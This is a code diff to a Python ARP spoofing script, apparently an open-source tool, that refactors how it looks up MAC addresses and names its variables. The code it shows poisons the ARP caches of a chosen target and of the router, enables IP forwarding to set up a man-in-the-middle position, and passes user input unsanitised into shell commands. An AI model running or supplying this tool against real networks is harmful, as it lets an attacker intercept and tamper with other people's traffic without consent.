@@ -14,19 +14,19 @@
 ## GNU General Public License at (http://www.gnu.org/licenses/) for
 ## more details.
 
-from netifaces import gateways
+from netifaces import gateways, AF_INET, AF_LINK, ifaddresses
 from scapy.all import *
 from time import sleep
-from sys import argv
 from os import popen
-import argparse
+from argparse import ArgumentParser
 
-def originalMAC(ip):
-	popen('ping %s -c 2' % ip).read()
-	return popen("arp | grep '%s' | cut -d 'r' -f 2- | cut -d ' ' -f 4" %(ip)).read().strip()
+def fgetmac(ip):
+	popen('ping %s -c 2 -i 0.5' % ip).read()
+	return popen("arp -a | grep '%s' | cut -d 't' -f 2 | cut -d ' ' -f 2" %(ip)).read().strip()
 
 def fownmac():
-	return popen("ifconfig | grep eth | cut -d ' ' -f 11").read().strip()
+	def_gw_device = gateways()['default'][AF_INET][1]
+	return ifaddresses(def_gw_device)[AF_LINK][0]['addr']
 
 def ffix():
 	resettarget=ARP(op=1,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=routermac)
@@ -36,7 +36,7 @@ def ffix():
 	if not args.mac:
 		popen("echo 0 > /proc/sys/net/ipv4/ip_forward").read()
 
-parser = argparse.ArgumentParser(prog='arpspoof', usage='./arpspoof.py [options]')
+parser = ArgumentParser(prog='arpspoof', usage='./arpspoof.py [options]')
 parser.add_argument('-t', "--targetip", type=str, help='Last digit of IP eg. 213')
 parser.add_argument('-m', "--mac", type=str, help='Spoof to user defined MAC.')
 parser.add_argument('-r', "--replies", action="store_true", help='Use ARP replies instead of requests.')
@@ -46,9 +46,9 @@ args = parser.parse_args()
 ismitm = ''
 
 if args.mac:
-	mac = args.mac
+	spoofmac = args.mac
 else:
-	mac = fownmac()
+	spoofmac = fownmac()
 	popen("echo 1 > /proc/sys/net/ipv4/ip_forward").read()
 	ismitm = ' (MiTM)'
 
@@ -61,9 +61,9 @@ except:
 	parser.print_help()
 	exit()
 
-routermac = originalMAC(routerip)
+routermac = fgetmac(routerip)
 print " [*] Detected router: %s (%s)" % (routerip, routermac)
-targetmac = originalMAC(targetip)
+targetmac = fgetmac(targetip)
 print " [*] Detected target: %s (%s)" % (targetip, targetmac)
 
 if args.replies:
@@ -73,10 +73,10 @@ else:
 	targetop = 1
 	print " [*] Using ARP requests."
 
-poisontarget=ARP(op=targetop,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=mac)
-poisonrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=mac)
+poisontarget=ARP(op=targetop,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=spoofmac)
+poisonrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=spoofmac)
 
-print " [*] Spoofing to: %s%s" % (mac, ismitm)
+print " [*] Spoofing to: %s%s" % (spoofmac, ismitm)
 print " [*] Attacking."
 
 try:
